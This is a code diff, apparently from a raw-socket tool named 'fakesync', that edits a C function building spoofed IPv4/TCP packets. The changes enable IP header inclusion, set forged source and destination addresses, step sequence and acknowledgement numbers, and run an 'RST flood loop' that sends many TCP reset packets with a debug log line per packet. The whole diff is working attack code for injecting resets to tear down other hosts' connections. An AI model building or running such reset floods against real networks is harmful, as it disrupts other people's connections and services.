@@ -209,7 +209,6 @@ void reset(const uint32_t saddr, const uint32_t daddr,
     struct iphdr *iph;
     struct tcphdr *tcph, *cstcph;
     struct pshdr *psh;
-    char sIP[INET6_ADDRSTRLEN], dIP[INET6_ADDRSTRLEN];
     uint16_t win = 8192, id0 = rand() %(65536);
     size_t tcp_len;
     struct sockaddr_in sa;
@@ -220,11 +219,11 @@ void reset(const uint32_t saddr, const uint32_t daddr,
         exit(-1);
     }
 
-    // // Set option to include protocol header
-    // if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &yes, sizeof yes) <0) {
-    //     perror("fakesync: socketopt()\n");
-    //     exit(-1);
-    // }
+    // Set option to include protocol header
+    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &yes, sizeof yes) <0) {
+        perror("fakesync: socketopt()\n");
+        exit(-1);
+    }
 
     // carve out IP header and TCP header
     memset(datagram, 0, sizeof datagram);
@@ -246,8 +245,8 @@ void reset(const uint32_t saddr, const uint32_t daddr,
     iph -> ttl = 64; // time to live
     iph -> protocol = IPPROTO_TCP; // TCP
     iph -> check = 0;
-    inet_pton(AF_INET, sIP, &(iph -> saddr));
-    inet_pton(AF_INET, dIP, &(iph -> daddr));
+    iph -> saddr = saddr;
+    iph -> daddr = daddr;
 
     // calculate IP check sum
     iph -> check = ip_checksum((void *) datagram, sizeof(struct iphdr) + tcp_len);
@@ -277,8 +276,8 @@ void reset(const uint32_t saddr, const uint32_t daddr,
     memcpy(cstcph, (char *)tcph, tcp_len);
 
     // pack pseudo header
-    inet_pton(AF_INET, sIP, &(psh -> src_addr)); // 32 bit source address
-    inet_pton(AF_INET, dIP, &(psh -> dst_addr)); // 32 bit destination address
+    psh -> src_addr = saddr;
+    psh -> dst_addr = daddr;
     psh -> reserved = 0;
     psh -> protocol = IPPROTO_TCP; // TCP
     psh -> tcp_len = htons(tcp_len); // TCP segment length
@@ -291,8 +290,8 @@ void reset(const uint32_t saddr, const uint32_t daddr,
     // RST flood loop
     for (count = 0; count < NUM_OF_RESET; count++) {
         // reset the server
-        // tcph -> seq = htonl(seq0); // set seq number
-        // cstcph -> seq = htonl(seq0); // set seq number in the checksum header
+        tcph -> seq = htonl(seq0++); // set seq number
+        cstcph -> seq = htonl(seq0); // set seq number in the checksum header
         tcph -> ack_seq = htonl(ack0++); // set ack seq number
         cstcph -> ack_seq = htonl(ack0); // set ack seq number in the checksum header
         tcph -> check = 0; // reset check sum
@@ -303,9 +302,7 @@ void reset(const uint32_t saddr, const uint32_t daddr,
         {
             perror("fakesync: sendto()\n");
         }
-        if ((count++) % 20 == 0) {
-            printf( "%d RST packets sent\n", count);
-        }
+        fprintf(logfile, "DEBUG reset packet sent\n saddr: %u\ndaddr: %u\nseq: %u\nack: %u\n", saddr, daddr, seq0, ack0);
     }
     close(sockfd);
 }
